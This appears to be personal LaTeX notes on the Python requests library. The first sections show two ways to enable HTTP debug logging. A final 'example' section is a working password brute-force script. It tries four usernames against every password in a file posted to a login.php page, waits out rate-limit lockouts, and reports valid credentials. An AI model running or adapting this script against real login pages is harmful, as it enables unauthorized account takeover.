\section{Requests}


\url{https://requests.readthedocs.io/en/latest/}
\subsection{logging}
\subsubsection{Solution 1}
\begin{verbatim}
import requests
import http
import logging

# Set up logging to a file
logging.basicConfig(filename="app.log", level=logging.DEBUG)
logger = logging.getLogger(__name__)
http.client.HTTPConnection.debuglevel = 1

# Monkey patch the print() function and redirect it to a logger.debug() call
def print_to_log(*args):
    logger.debug(" ".join(args))
http.client.print = print_to_log

# Test HTTP GET and POST
url = "http://localhost:5000/test"

logger.info("Sending HTTP GET")
resp = requests.get(url)

logger.info("Sending HTTP POST")
resp = requests.post(url, data='My Test Data')
\end{verbatim}

\subsubsection{solution 2} 
\begin{verbatim}
\import logging
import contextlib
try:
    from http.client import HTTPConnection # py3
except ImportError:
    from httplib import HTTPConnection # py2

def debug_requests_on():
    '''Switches on logging of the requests module.'''
    HTTPConnection.debuglevel = 1

    logging.basicConfig()
    logging.getLogger().setLevel(logging.DEBUG)
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.DEBUG)
    requests_log.propagate = True

def debug_requests_off():
    '''Switches off logging of the requests module, might be some side-effects'''
    HTTPConnection.debuglevel = 0

    root_logger = logging.getLogger()
    root_logger.setLevel(logging.WARNING)
    root_logger.handlers = []
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.WARNING)
    requests_log.propagate = False

@contextlib.contextmanager
def debug_requests():
    '''Use with 'with'!'''
    debug_requests_on()
    yield
    debug_requests_off()
\end{verbatim}

call:
\begin{verbatim}
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> debug_requests_on()
>>> requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
DEBUG:requests.packages.urllib3.connectionpool:"GET / HTTP/1.1" 200 12150
send: 'GET / HTTP/1.1\r\nHost: httpbin.org\r\nConnection: keep-alive\r\nAccept-
Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.11.1\r\n\r\n'
reply: 'HTTP/1.1 200 OK\r\n'
header: Server: nginx
...
<Response [200]>

>>> debug_requests_off()
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> with debug_requests():
...     requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
...
<Response [200]>
\end{verbatim}


\subsection{example}
\begin{verbatim}
import requests
import time
url = "http://{}/login.php".format(ip)
# rate limit blocks for 30 seconds
lock_time = 30
# message that alert us we hit rate limit
lock_message = "Too many login failure"
# read user and password
for username in ["support.cn", "support.gr", "support.it",  "support.us"]:
    with open(userpass_file, "r") as fh:
        for fline in fh:
            if fline.startswith("#"):
                continue
            password = fline.rstrip()
            data = {
                "userid": username,
                "passwd": password,
                "submit": "submit"
            }
    
            #print(" test {} ".format(password))
            # do the request
            res = requests.post(url, headers=headers, data=data)
            #print(res.text)
    
            # handle generic credential error
            if "Invalid credentials" in res.text:
                print("[-] Invalid credentials: userid:{} passwd:{}".format(user
name, password))
            elif lock_message in res.text:
                print("[-] Hit rate limit, sleeping 30")
                # do the actual sleep plus 0.5 to be sure
                time.sleep(lock_time+0.5)
            else:
                print("[+++++++++++] Valid credentials: userid:{} passwd:{}".for
mat(username, password))
                exit()

\end{verbatim}
